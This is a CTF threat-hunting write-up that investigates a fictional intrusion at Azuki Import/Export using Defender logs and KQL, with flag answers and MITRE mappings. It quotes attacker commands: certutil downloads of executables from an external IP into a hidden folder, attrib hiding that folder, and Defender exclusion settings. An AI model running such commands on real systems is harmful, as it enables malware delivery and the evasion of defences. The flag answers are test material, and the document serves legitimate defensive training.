# 🕵️ CTF Threat Hunt Report  
# Port of Entry – Azuki Import/Export (梓貿易株式会社)

---

## 📌 Incident Brief

Azuki Import/Export Trading Co., a 23-employee logistics company operating between Japan and Southeast Asia, experienced a suspected corporate espionage incident.

A competing organization undercut a 6-year shipping contract by exactly 3%. Shortly afterward, confidential supplier contracts and pricing data were discovered on underground forums.

This indicates a targeted intrusion and data exfiltration event.

---

## 🏢 Organization Overview

- **Company:** Azuki Import/Export Trading Co.
- **Industry:** Shipping & Logistics
- **Employees:** 23
- **Primary Compromised System:** `AZUKI-SL` (IT Administrator Workstation)
- **Evidence Source:** Microsoft Defender for Endpoint Logs

---

## 🎯 Investigation Objectives

The investigation aimed to determine:

1. What was the initial access method?
2. Which accounts were compromised?
3. What discovery activity occurred?
4. How did the attacker evade defenses?
5. What persistence mechanisms were established?
6. Was credential theft performed?
7. How was data collected and staged?
8. What exfiltration channel was used?
9. Was lateral movement observed?
10. What anti-forensic actions were taken?

---

## 🛠 Tools & Methodology

The investigation was conducted using:

- **Microsoft Defender for Endpoint**
- **Kusto Query Language (KQL)**

Primary log sources analyzed:

- `DeviceLogonEvents`
- `DeviceProcessEvents`
- `DeviceNetworkEvents`
- `DeviceFileEvents`
- `DeviceRegistryEvents`

All findings were derived from event telemetry between: 2025-11-18 through 2025-11-20

---

# 🚩 Flag 1 – Initial Access: Remote Access Source

## 🎯 Objective
Identify the source IP address responsible for the successful Remote Desktop Protocol (RDP) logon to the compromised system.

---

## 🛠 KQL Query Used


DeviceLogonEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-18) .. datetime(2025-11-20))
| where isnotempty(RemoteIP)
| where ActionType == "LogonSuccess"
| project TimeGenerated, AccountName, LogonType, RemoteIP, DeviceName, ActionType

## 📊 Evidence

Analysis of successful logon events revealed:

- **Timestamp:** 2025-11-19 18:36:21 UTC  
- **Account:** kenji.sato  
- **Logon Type:** Remote/Network Activity  
- **Remote IP:** 88.97.178.12  
- **Device:** azuki-sl  

The IP address `88.97.178.12` is a public external IP address and does not belong to a private internal range.

Subsequent activity from `10.0.8.9` indicates internal movement following the initial compromise.

---

## ✅ Flag 1 Answer: 88.97.178.12


## 🧠 Analysis

The attacker gained unauthorized access to `AZUKI-SL` via Remote Desktop Protocol using valid credentials from external IP address `88.97.178.12`.

This confirms the initial point of compromise and establishes the external origin of the intrusion.

---

## 🧭 MITRE ATT&CK Mapping

- **T1078** – Valid Accounts  
- **T1021.001** – Remote Desktop Protocol

---

# 🚩 Flag 2 – Initial Access: Compromised User Account

## 🎯 Objective
Identify the user account that was compromised and used during the unauthorized Remote Desktop session.

---

## 🛠 KQL Query Used

DeviceLogonEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-18) .. datetime(2025-11-20))
| where isnotempty(RemoteIP)
| where ActionType == "LogonSuccess"
| project TimeGenerated, AccountName, LogonType, RemoteIP, DeviceName, ActionType

## 📊 Evidence

Analysis of successful authentication events revealed:

- **Timestamp:** 2025-11-19 18:36:21 UTC  
- **Account:** kenji.sato  
- **Logon Type:** Unlock / Network  
- **Remote IP:** 88.97.178.12  
- **Device:** azuki-sl  

The account `kenji.sato` successfully authenticated from the external IP address `88.97.178.12`, which was previously identified as the source of the unauthorized RDP session.

Subsequent logon activity from internal IP `10.0.8.9` indicates continued activity after the initial compromise.

---

## ✅ Flag 2 Answer: kenji.sato


## 🧠 Analysis

The account `kenji.sato` was successfully used to authenticate to `AZUKI-SL` from an external IP address.

This confirms:

- Credential compromise  
- Unauthorized remote access  
- Use of valid account authentication  

The attacker leveraged legitimate credentials rather than exploiting a software vulnerability.

---

## 🧭 MITRE ATT&CK Mapping

- **T1078** – Valid Accounts  
- **T1021.001** – Remote Desktop Protocol

---

# 🚩 Flag 3 – Discovery: Network Reconnaissance

## 🎯 Objective
Identify evidence of post-compromise discovery activity performed by the attacker.

---

## 🛠 KQL Query Used

DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19T18:00:00Z) .. datetime(2025-11-21))
| where ProcessCommandLine has_any ("arp", "net view", "nbtstat", "netstat", "ping")
| project TimeGenerated, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AccountName
| order by TimeGenerated asc

---
## 📊 Evidence

The following suspicious process execution was identified:

- **Timestamp:** 2025-11-19 19:04:01 UTC  
- **Process:** ARP.EXE  
- **Command:** `ARP.EXE -a`  
- **Initiating Process:** powershell.exe  
- **Account:** kenji.sato  

The `arp -a` command enumerates the ARP cache to identify other systems on the local network.

The fact that it was executed via `powershell.exe` under the compromised account strongly indicates manual reconnaissance activity.

---

## ✅ Flag 3 Answer: arp -a


## 🧠 Analysis

After gaining access, the attacker performed local network discovery using:

- ARP table enumeration  

This suggests the attacker was:

- Identifying internal hosts  
- Mapping the local subnet  
- Preparing for potential lateral movement  

The use of PowerShell to launch the command further indicates hands-on-keyboard activity rather than automated system behavior.

---

## 🧭 MITRE ATT&CK Mapping

- **T1016** – System Network Configuration Discovery  
- **T1046** – Network Service Discovery  
- **T1059.001** – PowerShell

---

# 🚩 Flag 4 – Defense Evasion: Hidden Staging Directory

## 🎯 Objective
Identify evidence of defense evasion through the creation or concealment of a hidden directory used for staging.

---

## 🛠 KQL Query Used

DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19T18:00:00Z) .. datetime(2025-11-22))
| where ProcessCommandLine has_any ("mkdir", "md ", "New-Item", "attrib")
| project TimeGenerated, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AccountName
| order by TimeGenerated asc

## 📊 Evidence

The following suspicious command was executed:

- **Timestamp:** 2025-11-19 19:05:33 UTC  
- **Process:** attrib.exe  
- **Command:** `attrib.exe +h +s C:\ProgramData\WindowsCache`  
- **Initiating Process:** powershell.exe  
- **Account:** kenji.sato  

The command applied:

- `+h` → Hidden attribute  
- `+s` → System attribute  

to the directory: C:\ProgramData\WindowsCache

This action hides the directory from standard user view and reduces visibility unless hidden/system files are enabled.

---

## ✅ Flag 4 Answer: C:\ProgramData\WindowsCache

---

## 🧠 Analysis

The attacker modified the directory attributes to conceal a staging location under `C:\ProgramData`.

This strongly suggests:

- Creation of a hidden staging directory  
- Preparation for data collection or exfiltration  
- Intentional defense evasion  

Using `attrib.exe` with `+h +s` is a common technique to hide malicious artifacts.

---

## 🧭 MITRE ATT&CK Mapping

- **T1564.001** – Hide Artifacts: Hidden Files and Directories  
- **T1059.001** – PowerShell

---

# 🚩 Flag 5 – Defense Evasion: Windows Defender File Extension Exclusions

## 🎯 Objective
Determine how many file extensions were excluded from Windows Defender scanning.

---

## 📊 Evidence

Registry modifications were observed under:

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions

The following file extensions were added as exclusions:

- `.bat`
- `.ps1`
- `.exe`

Each entry had the action type:

- `RegistryValueSet`

This confirms that the attacker configured Windows Defender to ignore specific executable and script file types.

---

## ✅ Flag 5 Answer: 3

---

## 🧠 Analysis

By excluding:

- Batch files (`.bat`)
- PowerShell scripts (`.ps1`)
- Executables (`.exe`)

the attacker ensured that common payload formats would not be scanned or quarantined by Windows Defender.

This significantly increases the success rate of:

- Malicious script execution  
- Payload deployment  
- Persistence mechanisms  

---

## 🧭 MITRE ATT&CK Mapping

- **T1562.001** – Impair Defenses: Disable or Modify Tools  
- **T1112** – Modify Registry

---

# 🚩 Flag 6 – Defense Evasion: Windows Defender Path Exclusion

## 📊 Evidence

Registry modifications were observed under: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths

The following path was added as an exclusion:

- `C:\Users\KENJI~1.SAT\AppData\Local\Temp`

**Action Type:** `RegistryValueSet`

This indicates that the attacker configured Windows Defender to ignore the user’s local Temp directory.

---

## ✅ Flag 6 Answer: C:\Users\KENJI~1.SAT\AppData\Local\Temp

---

## 🧠 Analysis

By excluding the user’s **Temp directory**, the attacker ensured that:

- Dropped payloads would not be scanned  
- Scripts and executables staged in Temp would evade detection  
- Malicious activity could execute with reduced risk of quarantine  

The Temp directory is a common location for:

- Malware staging  
- Script execution  
- Tool deployment  

This strongly indicates deliberate defense evasion before further malicious actions.

---

## 🧭 MITRE ATT&CK Mapping

- **T1562.001** – Impair Defenses: Disable or Modify Tools  
- **T1112** – Modify Registry

---

# 🚩 Flag 7 – Living off the Land Binary (LOLBAS) Used for Payload Download

## 📊 Evidence

Suspicious process execution was identified involving:

- **Process:** `certutil.exe`
- **Command Examples:**
  - `certutil.exe -urlcache -f http://78.141.196.6:8080/svchost.exe C:\ProgramData\WindowsCache\svchost.exe`
  - `certutil.exe -urlcache -f http://78.141.196.6:8080/AdobeGC.exe C:\ProgramData\WindowsCache\AdobeGC.exe`
- **Initiating Process:** `powershell.exe`
- **Account:** kenji.sato

The `-urlcache -f` flags indicate that `certutil.exe` was used to download files from a remote server and save them locally.

---

## ✅ Flag 7 Answer: certutil.exe

---

## 🧠 Analysis

`certutil.exe` is a legitimate Windows utility commonly abused as a **Living off the Land Binary (LOLBAS)**.

In this case, it was used to:

- Download payloads from an external IP address  
- Save them into the previously hidden staging directory  
- Bypass traditional download monitoring mechanisms  

Using `certutil.exe` for file downloads is a well-known attacker technique because:

- It is signed by Microsoft  
- It is commonly allowed through application controls  
- It blends in with legitimate system activity  

This indicates active payload staging and likely malware deployment.

---

## 🧭 MITRE ATT&CK Mapping

- **T1105** – Ingress Tool Transfer  
- **T1218** – Signed Binary Proxy Execution  
- **T1059.001** – PowerShell

---


